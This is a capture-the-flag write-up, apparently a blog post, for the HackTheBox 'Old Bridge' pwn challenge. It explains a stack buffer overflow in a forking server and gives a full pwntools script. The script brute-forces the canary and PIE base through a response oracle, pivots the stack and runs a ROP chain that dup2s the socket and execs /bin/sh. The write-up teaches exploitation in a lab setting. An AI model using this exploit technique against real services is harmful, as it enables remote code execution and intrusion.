---
title: Old Bridge
date: 2026-09-08 20:38:00 +0100
categories: [blog]
tags: [pwnable, reversing]
math: true
mermaid: true
media_subpath: /assets/posts/2026-09-08-oldbridge
image:
  path: preview.png
---

## HackTheBox - Old Bridge

### Overview

**Old Bridge** is a hard-difficulty **pwn** challenge centered on a forked server vulnerable to a *buffer overflow*, with limited control over the instruction pointer.

### Program Analysis

We're given a single file, `oldbridge`:

```bash
mark@rwx:~/Desktop/Labs/HTB/Challenges/OldBridge$ file oldbridge
oldbridge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=30d49dc8bfda0dfd78b99f11b938bbee5601ddc9, not stripped
mark@rwx:~/Desktop/Labs/HTB/Challenges/OldBridge$ checksec oldbridge
[*] '/home/mark/Desktop/Labs/HTB/Challenges/OldBridge/oldbridge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
mark@rwx:~/Desktop/Labs/HTB/Challenges/OldBridge$
```

Everything is on except full RELRO and tbh doesn't matter here since we never touch the `GOT` during exploitation in this challenge.

Here's the decompilation of the binary

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  socklen_t addr_len; // [rsp+18h] [rbp-48h] BYREF
  int optval; // [rsp+1Ch] [rbp-44h] BYREF
  int port; // [rsp+20h] [rbp-40h]
  socklen_t len; // [rsp+24h] [rbp-3Ch]
  int fd; // [rsp+28h] [rbp-38h]
  __pid_t child_fd; // [rsp+2Ch] [rbp-34h]
  sockaddr addr; // [rsp+30h] [rbp-30h] BYREF
  struct sockaddr s_addr; // [rsp+40h] [rbp-20h] BYREF
  unsigned __int64 v11; // [rsp+58h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  optval = 1;
  if ( argc != 2 )
  {
    printf("usage: %s <port>\n", *argv);
    exit(1);
  }
  port = atoi(argv[1]);
  signal(SIGINT, (__sighandler_t)exit_server);
  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if ( server_fd < 0 )
  {
    perror("socket");
    exit(1);
  }
  if ( setsockopt(server_fd, 1, 2, &optval, 4u) < 0 )
  {
    perror("setsockopt");
    exit(1);
  }
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = htonl(0);
  *(_WORD *)addr.sa_data = htons(port);
  len = 16;
  if ( bind(server_fd, &addr, 0x10u) < 0 )
  {
    perror("bind");
    close(server_fd);
    exit(1);
  }
  if ( listen(server_fd, 5) < 0 )
  {
    perror("listen");
    close(server_fd);
    exit(1);
  }
  signal(SIGCHLD, (__sighandler_t)((char *)&dword_0 + 1));
  while ( 1 )
  {
    addr_len = 16;
    fd = accept(server_fd, &s_addr, &addr_len);
    if ( fd < 0 )
      break;
    child_fd = fork();
    if ( child_fd < 0 )
    {
      perror("fork");
      close(fd);
      close(server_fd);
      exit(1);
    }
    if ( !child_fd )
    {
      if ( (unsigned int)check_username(fd) )
        write(fd, "Username found!\n", 0x10uLL);
      close(fd);
      exit(0);
    }
    close(fd);
  }
  perror("accept");
  close(server_fd);
  exit(1);
}


__int64 __fastcall check_username(int a1)
{
  unsigned int v2; // [rsp+14h] [rbp-41Ch]
  int i; // [rsp+18h] [rbp-418h]
  int v4; // [rsp+1Ch] [rbp-414h]
  _BYTE buf[1032]; // [rsp+20h] [rbp-410h] BYREF
  unsigned __int64 v6; // [rsp+428h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v2 = 0;
  write(a1, "Username: ", 0xAuLL);
  v4 = read(a1, buf, 1056uLL);
  for ( i = 0; i < v4; ++i )
    buf[i] ^= 0xDu;
  if ( !memcmp(buf, "il{dih", 6uLL) )
    return 1;
  return v2;
}
```

The code is short and the bug is obvious.

`main` is pretty much templated socket programming. It creates a listener on the port we specify, then loops forever waiting for connections. Once we connect (`nc localhost 1337`), it forks a child to handle the actual flow in `check_username`.

`check_username` takes the `client_fd` as a parameter and reads up to `0x420` (1056) bytes into a buffer that only holds `0x408` (1032):

```c
char buf[1032];
n = read(client_fd, buf, 0x420);
```

It then XORs every byte it read with 0xD and memcmps the first 6 against `il{dih`.

Match means it returns 1 and we get *Username found!*, otherwise 0 and nothing.

With the stack buffer overflow present, there's just 24 bytes past the end of the buffer we have control over.

### Exploitation

Here's an overview of the stack frame layout.

```c
[ 1032 bytes buf ][ canary 8 ][ saved rbp 8 ][ return address 8 ]
```

Ideally this gives us only 8 bytes over the return address.

It's not a lot but it's usable!

The binary also comes with fancy gadgets that makes life easy.

![gadget1](gadget1.png)
![gadget2](gadget2.png)

But a huge restriction here is *ASLR / CANARY*, we don't have leaks so how can we get them?

Well it's pretty easy.

From the man page of [fork](https://man7.org/linux/man-pages/man2/fork.2.html)

![man](man.png)

> **Key point:** the child is an exact duplicate of the parent.

`fork()` hands the child a copy of the parent's address space, which means the **stack canary and the PIE base are identical in every child**. 

The parent never re-randomizes, so no matter how many children we crash, the next connection gets us another clone with the same memory space.

That turns an unguessable 64-bit value into 8 independent byte guesses, and gives us an oracle to check each one:
- **Wrong byte** => the canary check fails, `__stack_chk_fail` kills the child, connection drops with no output
- **Right byte** => `check_username` returns cleanly and we get back `Username found!`

We can use this same oracle to recover the saved RIP, which gives us the PIE base.

There's one catch in doing this though:
- `leave` restores `rbp` from the saved `rbp` before `ret`, and the code in `main` right after the call dereferences it (`mov eax, [rbp-0x38]` at `main+0x23a`)

```bash
.text:0000000000000C5C locret_C5C:                             ; CODE XREF: check_username+E6↑j
.text:0000000000000C5C                 leave
.text:0000000000000C5D                 retn

.text:0000000000000EBF loc_EBF:                                ; CODE XREF: main+1F7↑j
.text:0000000000000EC5                 mov     eax, [rbp+fd]
.text:0000000000000EC8                 mov     edi, eax
.text:0000000000000ECA                 call    check_username
.text:0000000000000ECF                 test    eax, eax
.text:0000000000000ED1                 jz      short loc_EE9
.text:0000000000000ED3                 mov     eax, [rbp+fd]
.text:0000000000000ED6                 mov     edx, 10h        ; n
.text:0000000000000EDB                 lea     rsi, aUsernameFound ; "Username found!\n"
.text:0000000000000EE2                 mov     edi, eax        ; fd
.text:0000000000000EE4                 call    _write
```

I tried to play this by jumping to `main+0x23d` (`mov rdx, 10h`) but that wouldn't give a proper oracle because the `file descriptor` for `write` needs to be `client fd`. But here it just ends up being `1` (remember `check_username` returns `1` on valid `memcmp`).

Fixing that is easy enough, leak the saved `rbp` first with the same oracle, then carry on with the plan.

For overcoming the limited rip control, we can just stack pivot.

Set `rbp` to `stack_buffer_address` and `rip` to `leave, ret`.

Remember that the `check_username` does a `leave, ret`.

So this ends up being:

```bash
; check_username' own epilogue
mov rsp, rbp    ; leave
pop rbp         ;   -> rbp = our fake value, from the payload
pop rip         ; ret  -> our leave;ret gadget

; the gadget
mov rsp, rbp    ; leave
pop rbp
pop rip         ; ret  -> first link of the chain
```

That effectively sets `rsp` to the address of our ropchain, and then we can trigger the whole ROPchain.

> **Note:** we're commuicating with the server via socket. The child never redirects its standard fds, so a shell popped by `execve` would read from wherever the server was launched not from our connection. We have to `dup2` the client fd onto stdin and stdout first, then `execve`. And since the parent closes its copy of the client fd every loop, so that slot is free again for the next connection; this means the client fd is going to be 4.

Here's the final solve [script](https://h4ckyou.github.io/assets/posts/2026-09-08-oldbridge/solve.py)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from pwnlib.term import output

exe = context.binary = ELF('oldbridge')
context.log_level = 'info'

HOST = "154.57.164.73"
PORT = 31436

OFFSET = 1032
CHUNK = b"il{dih"
KEY = 0xD
ORACLE = b"Username found!"

def leak_canary():
    CANARY = b""
    while len(CANARY) < 8:
        for i in range(0x100):
            io = remote(HOST, PORT)
            io.recvuntil(b"Username: ")
            data = xor(CHUNK + b"A" * (OFFSET - len(CHUNK)) + CANARY + bytes([i]), KEY)
            io.send(data)
            try:
                output = io.recv(len(ORACLE), timeout=1)
                if output == ORACLE:
                    info(f"Found canary byte: %#x", i)
                    CANARY += bytes([i])
            except EOFError:
                pass
            io.close()
    return u64(CANARY)

def leak_saved_rbp(canary):
    RBP = b""
    while len(RBP) < 6:
        for i in range(0x100):
            io = remote(HOST, PORT)
            io.recvuntil(b"Username: ")
            data = xor(CHUNK + b"A" * (OFFSET - len(CHUNK)) + canary + RBP + bytes([i]), KEY)
            io.send(data)
            try:
                output = io.recv(len(ORACLE), timeout=1)
                if output == ORACLE:
                    info(f"Found saved RBP byte: %#x", i)
                    RBP += bytes([i])
            except EOFError:
                pass
            io.close()
    return u64(RBP.ljust(8, b"\x00"))


def leak_pie(canary, saved_rbp):
    PIE = b"\xcf"
    while len(PIE) < 6:
        for i in range(0x100):
            io = remote(HOST, PORT)
            io.recvuntil(b"Username: ")
            data = xor(CHUNK + b"A" * (OFFSET - len(CHUNK)) + canary + saved_rbp + PIE + bytes([i]), KEY)
            io.send(data)
            try:
                output = io.recv(len(ORACLE), timeout=1)
                if output == ORACLE:
                    info(f"Found PIE byte: %#x", i)
                    PIE += bytes([i])
            except EOFError:
                pass
            io.close()
    return u64(PIE.ljust(8, b"\x00"))


def solve():

    canary = leak_canary()
    saved_rbp = leak_saved_rbp(p64(canary))
    pie = leak_pie(p64(canary), p64(saved_rbp))

    buffer = saved_rbp - 0x478
    base = pie - 0xecf

    info("Leaked canary: %#x", canary)
    info("Leaked saved RBP: %#x", saved_rbp)
    info("Leaked PIE: %#x", pie)

    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + base
    pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] + base
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0] + base
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] + base
    syscall = rop.find_gadget(['syscall', 'ret'])[0] + base
    leave_ret = rop.find_gadget(['leave', 'ret'])[0] + base

    chain = flat(
        [
            u64(b"/bin/sh\x00"), 0xcafebabe,
            pop_rdi, 0x4,
            pop_rsi, 0x0, 0x0,
            pop_rax, 0x21,
            syscall,
            pop_rdi, 0x4,
            pop_rsi, 0x1, 0x0,
            pop_rax, 0x21,
            syscall,
            pop_rdi, buffer,
            pop_rsi, 0x0, 0x0,
            pop_rdx, 0x0,
            pop_rax, 0x3b,
            syscall
        ]
    )

    payload = b"A"*8
    payload += chain
    payload += b"A" * (OFFSET - len(payload))
    payload += p64(canary)
    payload += p64(buffer + 0x8)
    payload += p64(leave_ret)

    io = remote(HOST, PORT)
    io.recvuntil(b"Username: ")
    io.send(xor(payload, KEY))
    io.interactive()
    
if __name__ == "__main__":
    solve()
```

Running it works!

![done](done.png)

ありがとうございます！😊